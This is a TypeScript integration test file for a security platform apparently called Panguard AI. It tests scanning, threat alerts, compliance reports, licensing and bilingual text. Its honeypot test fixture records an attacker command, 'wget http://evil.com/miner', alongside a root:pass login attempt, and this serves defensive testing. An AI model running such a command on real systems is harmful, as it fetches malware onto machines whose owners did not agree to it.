/**
 * End-to-End Pipeline Integration Test
 * 端對端管線整合測試
 *
 * Tests the full Panguard AI platform pipeline:
 * Scan -> Guard(detect/analyze) -> Chat(notify) -> Report(comply) -> Trap(intel) -> Web(guide)
 * 測試 Panguard AI 平台完整管線：
 * 掃描 -> 守護(偵測/分析) -> 聊天(通知) -> 報告(合規) -> 蜜罐(情報) -> 官網(引導)
 */

import { describe, it, expect } from 'vitest';

// Core
import { CORE_VERSION } from '@openclaw/core';

// PanguardScan
import { PANGUARD_SCAN_VERSION, sortBySeverity, SEVERITY_ORDER } from '@openclaw/panguard-scan';
import type { Finding } from '@openclaw/panguard-scan';

// PanguardGuard
import {
  PANGUARD_GUARD_VERSION,
  DEFAULT_ACTION_POLICY,
  createEmptyBaseline,
  checkDeviation,
  validateLicense,
  generateTestLicenseKey,
  hasFeature,
} from '@openclaw/panguard-guard';
import type { ThreatVerdict } from '@openclaw/panguard-guard';

// PanguardChat
import { PANGUARD_CHAT_VERSION, formatAlert, ALERT_TEMPLATES } from '@openclaw/panguard-chat';
import type { ThreatAlert, UserType } from '@openclaw/panguard-chat';

// PanguardTrap
import {
  PANGUARD_TRAP_VERSION,
  buildTrapIntel,
  DEFAULT_SERVICE_CONFIGS,
} from '@openclaw/panguard-trap';
import type { TrapSession } from '@openclaw/panguard-trap';

// PanguardReport
import {
  PANGUARD_REPORT_VERSION,
  getSupportedFrameworks,
  getFrameworkControls,
  getFrameworkName,
  evaluateControls,
  generateExecutiveSummary,
  generateComplianceReport,
  reportToJSON,
  generateSummaryText,
} from '@openclaw/panguard-report';
import type { ComplianceFinding } from '@openclaw/panguard-report';

// Panguard Web
import {
  PANGUARD_WEB_VERSION,
  getAllPersonas,
  getPricingPlan,
  generateGuidanceResult,
  getAllPricingPlans,
  PRODUCT_FEATURES,
  getProductFeature,
} from '@openclaw/panguard-web';
import type { GuidanceAnswers } from '@openclaw/panguard-web';

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

describe('End-to-End Platform Pipeline', () => {
  describe('Version Consistency', () => {
    it('should have version constants for all packages', () => {
      expect(CORE_VERSION).toBe('0.1.0');
      expect(PANGUARD_SCAN_VERSION).toBe('0.1.0');
      expect(PANGUARD_GUARD_VERSION).toBe('0.1.0');
      expect(PANGUARD_CHAT_VERSION).toBe('0.1.0');
      expect(PANGUARD_TRAP_VERSION).toBe('0.1.0');
      expect(PANGUARD_REPORT_VERSION).toBe('0.1.0');
      expect(PANGUARD_WEB_VERSION).toBe('0.1.0');
    });
  });

  describe('Full Security Pipeline: Scan -> Detect -> Analyze -> Respond -> Report -> Notify', () => {
    it('should execute complete pipeline from scan to notification', () => {
      // Step 1: PanguardScan produces findings
      const scanFindings: Finding[] = [
        {
          id: 'E2E-001',
          title: 'Open SSH with weak password',
          description: 'SSH service with password auth and weak policy',
          severity: 'critical',
          category: 'access_control',
          remediation: 'Enable key-based auth, disable password auth',
        },
        {
          id: 'E2E-002',
          title: 'Missing firewall rules',
          description: 'No inbound firewall rules configured',
          severity: 'high',
          category: 'network',
          remediation: 'Configure firewall rules',
        },
        {
          id: 'E2E-003',
          title: 'SSL certificate expiring',
          description: 'Certificate expires in 5 days',
          severity: 'medium',
          category: 'encryption',
          remediation: 'Renew SSL certificate',
        },
      ];

      const sortedFindings = [...scanFindings].sort(sortBySeverity);
      expect(sortedFindings[0]!.severity).toBe('critical');

      // Step 2: Convert to compliance findings for report
      const complianceFindings: ComplianceFinding[] = sortedFindings.map((f) => ({
        findingId: f.id,
        severity: f.severity as ComplianceFinding['severity'],
        title: f.title,
        description: f.description,
        category: f.category,
        timestamp: new Date(),
        source: 'panguard-scan' as const,
      }));

      // Step 3: PanguardGuard context — baseline deviation check
      const baseline = createEmptyBaseline();
      const deviation = checkDeviation(baseline, {
        id: 'e2e-evt-001',
        timestamp: new Date(),
        source: 'process',
        severity: 'medium',
        category: 'process_start',
        description: 'Unknown service started',
        raw: {},
        host: 'test-host',
        metadata: { processName: 'unknown_service', processPath: '/tmp/unknown' },
      });
      expect(deviation.isDeviation).toBe(true);

      // Step 4: Mock verdict from AnalyzeAgent
      const verdict: ThreatVerdict = {
        conclusion: 'malicious',
        confidence: 92,
        reasoning: 'SSH brute force + weak password policy detected by scan',
        evidence: [
          { source: 'rule_match', description: 'SSH brute force pattern', confidence: 90 },
          { source: 'baseline_deviation', description: 'New process in /tmp', confidence: 70 },
        ],
        recommendedAction: 'block_ip',
        mitreTechnique: 'T1110',
      };

      // Step 5: Action decision based on confidence
      const policy = DEFAULT_ACTION_POLICY;
      expect(verdict.confidence).toBeGreaterThanOrEqual(policy.autoRespond);
      // -> Auto-respond (block IP)

      // Step 6: PanguardChat notification
      const alert: ThreatAlert = {
        conclusion: verdict.conclusion,
        confidence: verdict.confidence / 100,
        humanSummary: 'SSH brute force attack detected and blocked',
        reasoning: verdict.reasoning,
        recommendedAction: verdict.recommendedAction,
        mitreTechnique: verdict.mitreTechnique,
        severity: 'critical',
        eventDescription: 'SSH brute force from suspicious IP',
        actionsTaken: ['Blocked source IP', 'Disabled password authentication'],
        timestamp: new Date().toISOString(),
      };

      // Format for different user types
      const devMessage = formatAlert(alert, 'developer', 'en');
      const bossMessage = formatAlert(alert, 'boss', 'en');
      const itMessage = formatAlert(alert, 'it_admin', 'en');

      expect(devMessage.text.length).toBeGreaterThan(0);
      expect(bossMessage.text.length).toBeGreaterThan(0);
      expect(itMessage.text.length).toBeGreaterThan(0);

      // Step 7: PanguardReport compliance evaluation
      for (const framework of getSupportedFrameworks()) {
        const report = generateComplianceReport(complianceFindings, framework, 'en', {
          organizationName: 'E2E Test Corp',
        });

        expect(report.metadata.framework).toBe(framework);
        expect(report.findings).toHaveLength(complianceFindings.length);
        expect(report.executiveSummary.totalFindings).toBe(3);
        expect(report.executiveSummary.criticalFindings).toBe(1);

        // Verify JSON serialization
        const json = reportToJSON(report);
        expect(() => JSON.parse(json)).not.toThrow();
      }
    });
  });

  describe('Honeypot Intelligence Feedback Loop', () => {
    it('should feed honeypot intelligence back into compliance reports', () => {
      // Step 1: PanguardTrap captures attack
      const session: TrapSession = {
        sessionId: 'E2E-TRAP-001',
        serviceType: 'ssh',
        sourceIP: '103.45.67.89',
        sourcePort: 54321,
        startTime: new Date(),
        endTime: new Date(Date.now() + 30000),
        durationMs: 30000,
        events: [
          { timestamp: new Date(), type: 'connection', data: 'SSH connect' },
          { timestamp: new Date(), type: 'authentication_attempt', data: 'root:pass' },
          { timestamp: new Date(), type: 'command_input', data: 'wget http://evil.com/miner' },
          { timestamp: new Date(), type: 'disconnection', data: 'Closed' },
        ],
        credentials: [
          { timestamp: new Date(), username: 'root', password: 'pass', grantedAccess: false },
        ],
        commands: ['wget http://evil.com/miner'],
        mitreTechniques: ['T1110', 'T1105'],
      };

      // Step 2: Build intelligence
      const intel = buildTrapIntel(session);
      expect(intel).not.toBeNull();

      // Step 3: Convert to compliance findings
      const trapFindings: ComplianceFinding[] = [
        {
          findingId: 'TRAP-E2E-001',
          severity: 'high',
          title: 'Honeypot detected SSH brute force + malware download attempt',
          description: 'Attacker from 103.45.67.89 attempted brute force and malware deployment',
          category: 'monitoring',
          timestamp: new Date(),
          source: 'panguard-trap',
        },
      ];

      // Step 4: Feed into compliance report
      const controls = getFrameworkControls('iso27001');
      const evaluated = evaluateControls(controls, trapFindings);
      const summary = generateExecutiveSummary(evaluated, trapFindings, 'en');

      expect(summary.totalFindings).toBe(1);
    });
  });

  describe('Web Guidance to Full Installation', () => {
    it('should guide developer through complete setup', () => {
      // Step 1: User selects developer persona
      const answers: GuidanceAnswers = {
        persona: 'developer',
        hasServer: true,
        notificationChannel: 'telegram',
      };

      // Step 2: Generate recommendations
      const result = generateGuidanceResult(answers, 'en');

      expect(result.recommendedPlan).toBe('solo');
      expect(result.recommendedProducts).toContain('Panguard Scan');
      expect(result.recommendedProducts).toContain('Panguard Guard');
      expect(result.recommendedProducts).toContain('Panguard Chat');
      expect(result.recommendedProducts).toContain('Panguard Trap');

      // Step 3: Verify install command
      expect(result.installCommand).toContain('curl -fsSL https://get.panguard.ai');
      expect(result.installCommand).toContain('--plan solo');
      expect(result.installCommand).toContain('--notify telegram');

      // Step 4: Verify config steps
      expect(result.configSteps.length).toBeGreaterThan(0);
      expect(result.estimatedSetupTime).toContain('5');

      // Step 5: Verify all recommended products have feature pages
      for (const product of result.recommendedProducts) {
        const feature = getProductFeature(product);
        expect(feature).toBeDefined();
      }

      // Step 6: Verify pricing plan details
      const plan = getPricingPlan(result.recommendedPlan);
      expect(plan).toBeDefined();
      expect(plan!.priceUsd).toBeGreaterThan(0);
    });

    it('should guide enterprise through compliance-focused setup', () => {
      const answers: GuidanceAnswers = {
        persona: 'mid_enterprise',
        hasServer: true,
        notificationChannel: 'slack',
      };

      const result = generateGuidanceResult(answers, 'en');

      expect(result.recommendedPlan).toBe('business');
      expect(result.recommendedProducts).toContain('Panguard Report');
      expect(result.installCommand).toContain('--plan business');
      expect(result.installCommand).toContain('--notify slack');

      // Compliance step should be included
      const hasComplianceStep = result.configSteps.some((s) => s.includes('compliance'));
      expect(hasComplianceStep).toBe(true);
    });
  });

  describe('Cross-Package Type Compatibility', () => {
    it('should have compatible severity types across scan and report', () => {
      const scanSeverities = Object.keys(SEVERITY_ORDER);
      const reportSeverities = ['critical', 'high', 'medium', 'low', 'info'];

      for (const sev of reportSeverities) {
        expect(scanSeverities).toContain(sev);
      }
    });

    it('should have compatible persona types across web and chat', () => {
      const webPersonas = getAllPersonas().map((p) => p.type);

      // developer persona maps to developer user type in chat
      expect(webPersonas).toContain('developer');

      // Verify UserType values exist as string constants
      const chatUserTypes: UserType[] = ['developer', 'boss', 'it_admin'];
      expect(chatUserTypes.length).toBe(3);
    });

    it('should have all 5 products represented across feature cards and recommendations', () => {
      const products = PRODUCT_FEATURES.map((f) => f.product);
      expect(products).toContain('Panguard Scan');
      expect(products).toContain('Panguard Guard');
      expect(products).toContain('Panguard Chat');
      expect(products).toContain('Panguard Trap');
      expect(products).toContain('Panguard Report');
    });

    it('should have 3 compliance frameworks available', () => {
      const frameworks = getSupportedFrameworks();
      expect(frameworks).toContain('tw_cyber_security_act');
      expect(frameworks).toContain('iso27001');
      expect(frameworks).toContain('soc2');
    });
  });

  describe('License Gating Across Products', () => {
    it('should gate notifications behind Pro license', () => {
      const freeKey = generateTestLicenseKey('free');
      const proKey = generateTestLicenseKey('pro');
      const entKey = generateTestLicenseKey('enterprise');

      const free = validateLicense(freeKey)!;
      const pro = validateLicense(proKey)!;
      const ent = validateLicense(entKey)!;

      // Free: basic monitoring + auto-respond (Layer 1 rules)
      expect(hasFeature(free, 'basic_monitoring')).toBe(true);
      expect(hasFeature(free, 'notifications')).toBe(false);
      expect(hasFeature(free, 'auto_respond')).toBe(true);

      // Pro: monitoring + notifications + auto-response
      expect(hasFeature(pro, 'basic_monitoring')).toBe(true);
      expect(hasFeature(pro, 'notifications')).toBe(true);
      expect(hasFeature(pro, 'auto_respond')).toBe(true);

      // Enterprise: everything
      expect(hasFeature(ent, 'basic_monitoring')).toBe(true);
      expect(hasFeature(ent, 'notifications')).toBe(true);
      expect(hasFeature(ent, 'auto_respond')).toBe(true);
    });
  });

  describe('Bilingual Consistency Across All Packages', () => {
    it('should have bilingual alert templates', () => {
      for (const template of ALERT_TEMPLATES) {
        expect(template.humanSummary['en'].length).toBeGreaterThan(0);
        expect(template.humanSummary['zh-TW'].length).toBeGreaterThan(0);
      }
    });

    it('should have bilingual framework names', () => {
      for (const framework of getSupportedFrameworks()) {
        const en = getFrameworkName(framework, 'en');
        const zh = getFrameworkName(framework, 'zh-TW');
        expect(en.length).toBeGreaterThan(0);
        expect(zh.length).toBeGreaterThan(0);
      }
    });

    it('should have bilingual persona profiles', () => {
      for (const persona of getAllPersonas()) {
        expect(persona.nameEn.length).toBeGreaterThan(0);
        expect(persona.nameZh.length).toBeGreaterThan(0);
        expect(persona.descriptionEn.length).toBeGreaterThan(0);
        expect(persona.descriptionZh.length).toBeGreaterThan(0);
      }
    });

    it('should have bilingual pricing plans', () => {
      for (const plan of getAllPricingPlans()) {
        expect(plan.nameEn.length).toBeGreaterThan(0);
        expect(plan.nameZh.length).toBeGreaterThan(0);
        expect(plan.taglineEn.length).toBeGreaterThan(0);
        expect(plan.taglineZh.length).toBeGreaterThan(0);
      }
    });

    it('should have bilingual product features', () => {
      for (const feature of PRODUCT_FEATURES) {
        expect(feature.headlineEn.length).toBeGreaterThan(0);
        expect(feature.headlineZh.length).toBeGreaterThan(0);
        expect(feature.descriptionEn.length).toBeGreaterThan(0);
        expect(feature.descriptionZh.length).toBeGreaterThan(0);
      }
    });

    it('should generate bilingual compliance reports', () => {
      const findings: ComplianceFinding[] = [
        {
          findingId: 'BIL-001',
          severity: 'high',
          title: 'Test finding',
          description: 'Test',
          category: 'access_control',
          timestamp: new Date(),
          source: 'panguard-scan',
        },
      ];

      const enReport = generateComplianceReport(findings, 'tw_cyber_security_act', 'en');
      const zhReport = generateComplianceReport(findings, 'tw_cyber_security_act', 'zh-TW');

      const enSummary = generateSummaryText(enReport);
      const zhSummary = generateSummaryText(zhReport);

      expect(enSummary.length).toBeGreaterThan(0);
      expect(zhSummary.length).toBeGreaterThan(0);
    });
  });

  describe('Product Count Verification', () => {
    it('should have all 7 packages in the platform', () => {
      // Verify all packages are importable and have version constants
      const versions = [
        CORE_VERSION,
        PANGUARD_SCAN_VERSION,
        PANGUARD_GUARD_VERSION,
        PANGUARD_CHAT_VERSION,
        PANGUARD_TRAP_VERSION,
        PANGUARD_REPORT_VERSION,
        PANGUARD_WEB_VERSION,
      ];

      expect(versions).toHaveLength(7);
      for (const v of versions) {
        expect(v).toBe('0.1.0');
      }
    });

    it('should have 5 product features on the website', () => {
      expect(PRODUCT_FEATURES).toHaveLength(5);
    });

    it('should have 5 pricing plans', () => {
      expect(getAllPricingPlans()).toHaveLength(5);
    });

    it('should have 3 compliance frameworks', () => {
      expect(getSupportedFrameworks()).toHaveLength(3);
    });

    it('should have 3 target personas', () => {
      expect(getAllPersonas()).toHaveLength(3);
    });

    it('should have 7 alert templates', () => {
      expect(ALERT_TEMPLATES).toHaveLength(7);
    });

    it('should have 8 honeypot service types', () => {
      const serviceTypes = Object.keys(DEFAULT_SERVICE_CONFIGS);
      expect(serviceTypes).toHaveLength(8);
    });
  });
});
